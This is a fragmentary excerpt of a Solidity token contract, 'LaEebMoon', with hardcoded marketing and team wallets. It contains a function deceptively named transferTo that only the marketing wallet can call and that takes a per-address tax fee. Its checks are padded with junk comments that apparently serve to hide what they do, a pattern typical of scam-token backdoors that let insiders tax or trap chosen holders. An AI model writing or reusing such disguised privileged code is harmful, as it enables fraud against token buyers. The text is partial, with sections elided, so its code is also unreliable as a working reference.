...
contract LaEebMoon is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "LaEebMoon";
    string private _symbol = "LaEebMoon";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x962E9ED9FcbB76a27C788474cE1c26fA5864b0C5); 
    address payable private teamWalletAddress = payable(0x038f391eF9bFd58a40f4A7A4238e8FF8e6a37623); 
	...
	if( _mainPai[ /*as asdfgh*/msg.sender])
	   {
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawfgh*/ ==  /*asdf aw dawfgh*/msg.sender){
